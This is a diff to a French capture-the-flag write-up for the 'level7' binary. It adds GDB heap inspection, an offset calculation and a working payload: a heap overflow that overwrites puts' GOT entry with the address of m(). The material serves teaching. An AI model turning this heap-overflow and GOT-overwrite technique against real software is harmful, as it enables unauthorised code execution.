@@ -205,7 +205,121 @@ struct_b[1] = buffer_b; // POINTEUR utilisé par strcpy !
 
 ## 🚀 Construction du payload
 
-### Étape 1 : Trouver les adresses critiques
+### Étape 1 : Vérifier l'offset (IMPORTANT)
+
+**Toujours vérifier l'offset, ne jamais assumer !**
+
+#### Méthode 1 : GDB + Examine heap (recommandée)
+
+```bash
+gdb level7
+
+# Breakpoint sur strcpy pour s'arrêter avant le crash
+(gdb) break strcpy
+Breakpoint 1 at 0x80483e0
+
+(gdb) run a b
+# Arguments courts pour éviter le crash
+# S'arrête au premier strcpy, heap déjà alloué
+
+# Examiner la structure du heap
+(gdb) x/60wx 0x0804a000
+0x804a000:  0x00000000  0x00000011  0x00000001  0x0804a018
+            ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^
+            prev_size   size        struct_a[0] struct_a[1]
+            (header)    (header)    = 1         →Buffer A
+            
+0x804a010:  0x00000000  0x00000011  0x00000000  0x00000000
+            ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^
+            prev_size   size        Buffer A (vide)
+            (header)    (header)
+            
+0x804a020:  0x00000000  0x00000011  0x00000002  0x0804a038
+            ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^
+            prev_size   size        struct_b[0] struct_b[1] ← CIBLE !
+            (header)    (header)    = 2         →Buffer B
+            
+0x804a030:  0x00000000  0x00000011  0x00000000  0x00000000
+            ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^
+            prev_size   size        Buffer B (vide)
+            (header)    (header)
+
+# Identifier les adresses clés
+# Buffer A commence à   : 0x0804a018 (ligne 1, 4ème valeur)
+# struct_b[1] est à     : 0x0804a02c (ligne 3, 4ème valeur)
+# Offset = 0x02c - 0x018 = 0x14 = 20 bytes ✅
+```
+
+#### Méthode 2 : Calcul manuel (pédagogique)
+
+```
+De Buffer A (0x0804a018) jusqu'à struct_b[1] (0x0804a02c) :
+
+Buffer A          : 8 bytes (0x018 → 0x020)
+Header Struct B   : 8 bytes (0x020 → 0x028)
+struct_b[0]       : 4 bytes (0x028 → 0x02c)
+─────────────────────────────
+Total             : 20 bytes
+```
+
+#### Méthode 3 : Test empirique
+
+```bash
+./level7 $(python -c 'print "A"*20 + "BBBB"') test
+# Segfault → vérifier dans GDB quelle adresse a causé le crash
+# Si c'est 0x42424242 ("BBBB") → offset = 20 ✅
+```
+
+**Offset confirmé : 20 bytes**
+
+---
+
+### Étape 1 bis : Visualiser l'overflow en action (optionnel mais pédagogique)
+
+**Voir AVANT et APRÈS l'overflow** :
+
+```bash
+# AVANT l'overflow
+gdb level7
+(gdb) break strcpy
+(gdb) run a b
+(gdb) x/4wx 0x0804a020
+0x804a020:  0x00000000  0x00000011  0x00000002  0x0804a038
+                                                ^^^^^^^^^^
+                                                struct_b[1] = Buffer B
+
+(gdb) quit
+
+# APRÈS l'overflow
+gdb level7
+(gdb) break strcpy
+(gdb) run $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+(gdb) continue  # Passer au 2ème strcpy (après overflow)
+(gdb) x/4wx 0x0804a020
+0x804a020:  0x41414141  0x41414141  0x41414141  0x08049928
+                                                ^^^^^^^^^^
+                                                struct_b[1] = GOT puts ! ✅
+```
+
+**Observation** : `0x0804a038` (Buffer B) a été remplacé par `0x08049928` (GOT puts) !
+
+**Bonus - Voir argv[2] écrire dans la GOT** :
+
+```bash
+# Avant que argv[2] s'écrive
+(gdb) x/wx 0x08049928
+0x8049928 <puts@got.plt>:	0xb7e819b0  ← Adresse originale de puts
+
+(gdb) continue  # strcpy(GOT[puts], argv[2]) s'exécute
+
+# Après que argv[2] s'est écrit
+(gdb) x/wx 0x08049928
+0x8049928 <puts@got.plt>:	0x080484f4  ← Adresse de m() ! ✅
+```
+
+---
+
+### Étape 2 : Trouver les adresses critiques
 
 #### Adresse de `m()`
 ```bash
